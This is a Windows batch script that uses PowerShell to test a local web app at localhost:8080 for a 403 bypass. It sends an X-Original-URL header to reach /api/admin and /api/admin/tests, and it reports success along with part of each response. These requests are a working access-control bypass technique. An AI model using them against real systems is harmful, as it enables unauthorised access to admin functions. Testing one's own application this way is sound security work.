@echo off
REM Test Bypassing 403 Vulnerability
echo ====================================
echo Testing Bypassing 403 Vulnerability
echo ====================================
echo.

echo [TEST 1] Accessing /api/admin normally (should fail):
echo.
powershell -Command "try { Invoke-WebRequest -Uri 'http://localhost:8080/api/admin' -Method GET | Select-Object StatusCode, StatusDescription } catch { Write-Host 'Error:' $_.Exception.Message -ForegroundColor Red }"
echo.

echo [TEST 2] Bypassing with X-Original-URL header (VULNERABILITY):
echo.
powershell -Command "$headers = @{'X-Original-URL' = '/api/admin'}; try { $response = Invoke-WebRequest -Uri 'http://localhost:8080/' -Headers $headers -Method GET; Write-Host 'SUCCESS! Status:' $response.StatusCode -ForegroundColor Green; Write-Host 'Content Length:' $response.Content.Length; $response.Content.Substring(0, [Math]::Min(200, $response.Content.Length)) } catch { Write-Host 'Failed:' $_.Exception.Message }"
echo.

echo [TEST 3] Accessing admin tests endpoint:
echo.
powershell -Command "$headers = @{'X-Original-URL' = '/api/admin/tests'}; try { $response = Invoke-WebRequest -Uri 'http://localhost:8080/' -Headers $headers -Method GET; Write-Host 'SUCCESS! Status:' $response.StatusCode -ForegroundColor Green; Write-Host 'Content Length:' $response.Content.Length } catch { Write-Host 'Failed:' $_.Exception.Message }"
echo.

echo ====================================
echo Tests Complete
echo ====================================
pause
